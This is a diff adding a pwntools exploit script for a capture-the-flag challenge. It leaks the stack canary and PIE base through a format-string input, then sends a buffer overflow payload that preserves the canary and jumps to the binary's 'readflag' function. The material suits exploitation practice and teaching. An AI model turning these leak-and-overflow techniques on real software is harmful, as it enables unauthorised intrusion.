@@ -1,0 +1,31 @@
+from pwn import *
+exe = context.binary = ELF('./chall')
+r = process()
+# r = remote('9fba656c5e5ee568238f4a10561a3d27.chall.dvc.tf', 443, ssl=True)
+
+r.sendline('%19$p|%9$p')
+r.sendline('1')
+# r.recvuntil(b'Your identity is : \r\n')
+r.recvuntil(b'Your identity is : \n')
+msg = r.recvline().strip().decode().split('|')
+exe.address = int(msg[1],16) - 0x16fb
+log.info(f"FIXED PIE ADDRESS {hex(exe.address)}")
+canary = int(msg[0],16)
+log.info(f"FIXED CANARY {hex(canary)}")
+offset = 10
+rop = ROP(exe)
+ret = rop.find_gadget(['ret'])[0]
+log.info(f'ret address {hex(ret)}')
+rop.raw(b'A' * offset)
+rop.raw(p64(canary))
+rop.raw(b'B' * 8)
+# rop.raw(ret)
+rop.raw(exe.sym['readflag'])
+log.info(f"{msg}")
+r.sendline('3')
+sleep(3)
+r.sendline('-1')
+r.sendline(rop.chain())
+log.info(f"PAYLOAD => {rop.chain()}")
+print(r.recv(9999))
+r.interactive()
